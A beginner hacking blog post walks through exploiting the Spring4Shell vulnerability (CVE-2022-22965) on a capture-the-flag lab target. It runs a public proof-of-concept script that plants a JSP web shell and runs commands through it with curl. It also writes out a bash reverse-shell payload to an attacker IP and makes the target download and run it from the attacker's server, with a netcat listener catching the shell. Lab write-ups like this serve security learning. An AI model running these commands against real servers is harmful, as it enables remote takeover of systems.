---
title: CVE-2022-22965 - The Critical Spring4Shell Vulnerability
date: 2023-10-13 00:00:00 -500
categories: [Hacking for Beginners]
tags: [0day, cve, CTFs, Hacking]
image:
    path: https://i.ibb.co/cTdw811/spring.webp
---

Welcome back, Hackers, **to The Hacking Journey**, In this exciting articles, we will take a look about Spring4shell,  Spring4Shell, also known as `CVE-2022-22965`, is a remote code execution vulnerability within the Spring Framework. It's a name that resonates with the critical Log4Shell bug revealed in 2021.
If you're eager to enhance your hacking skills and learn alongside us, we invite you to join the ranks of aspiring hackers and cybersecurity enthusiasts.
- **The Best Academy to Learn Hacking is [Here](https://affiliate.hackthebox.com/nenandjabhata)**.
- **Beginner Friendly challenges on TryHackMe [Here](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.
- **Exploit The Lab [Here](https://echoctf.red/target/92)**.

## Exploitation 
Now we will explore how the exploitation works in more details.
### Lab Description :
This is a target with direct implementation of the Spring RCE vulnerability CVE-2022-22965, accessible at http://target:8080/helloworld/greeting. The target is here to assist in familiarizing and developing exploits and mitigation tools for this vulnerability.

Upon visiting the web page, you'll immediately notice a prominent message at the top: `Hello World! Exploit me! `.
Searching possible exploits for spring returns the following PoC: [Here](https://github.com/reznok/Spring4Shell-POC/blob/master/exploit.py).
We can try to exploit the vulnerability on this website.
```terminal
└─# python3 exploit.py
usage: exploit.py [-h] --url URL [--file FILE] [--dir DIR]
exploit.py: error: the following arguments are required: --url

└─# python3 exploit.py --url http://10.0.200.14:8080/helloworld/greeting
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://10.0.200.14:8080/shell.jsp?cmd=id
                                                                
```
Now if we visit that url in browser we will see the answer of the `id` command `uid=33(www-data) gid=33(www-data) groups=33(www-data) // `, then we can change it to another command like `ls`, `whoami` etc..
```terminal
└─# curl -s "http://10.0.200.14:8080/shell.jsp?cmd=ls" --output -
bin
boot
dev
entrypoint.sh
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

## Reverse Shell
Now we can try to get a shell on the server. We copy the payload below and save it in a file called shell.sh. 
`bash -c 'exec bash -i &>/dev/tcp/10.10.5.230/4444 <&1'`
We start a Listner Machine and also an http server Like This:
```terminal
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
In a second terminal, start a Netcat listener:
```terminal
└─# nc -lnvp 4444                                             
listening on [any] 4444 ...
```
Download the script onto the target machine and execute it to establish a reverse shell:
```
# curl http://10.0.200.14:8080/shell.jsp?cmd=curl%2010.10.5.230%2Fshell.sh%20-o%20%2Ftmp%2Fshell.sh%20--output%20-
```
Here, we've encoded all special characters in the curl command to ensure proper execution.
```terminal
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.200.14 - - [13/Oct/2023 12:18:46] "GET /shell.sh HTTP/1.1" 200 -
```
After downloading the script, use a web browser to execute it and trigger the reverse shell:
`http://10.0.200.14:8080/shell.jsp?cmd=bash%20%2Ftmp%2Fshell.sh`
Once executed, you'll receive a reverse shell connection, as indicated by the following:
```
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.5.230] from (UNKNOWN) [10.0.200.14] 47204
whoami;id;hostnamectl         
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Static hostname: 1337
       Icon name: computer-laptop
         Chassis: laptop 💻
      Machine ID: 5b6e1889fbdb4bcc88d63eabf7e2110b
         Boot ID: a383e3d1a72b45a8937cf92125545a33
Operating System: Kali GNU/Linux Rolling          
          Kernel: Linux 6.0.0-kali3-amd64
    Architecture: x86-64
 Hardware Vendor: Hewlett-Packard
  Hardware Model: HP EliteBook Folio 9470m
Firmware Version: 68IBD Ver. F.48
```

### Join Us
Thanks for reading. **Let's learn, explore, and hack together**. **Join us on Discord [here](https://discord.gg/wBT9wr9ruG)**. 
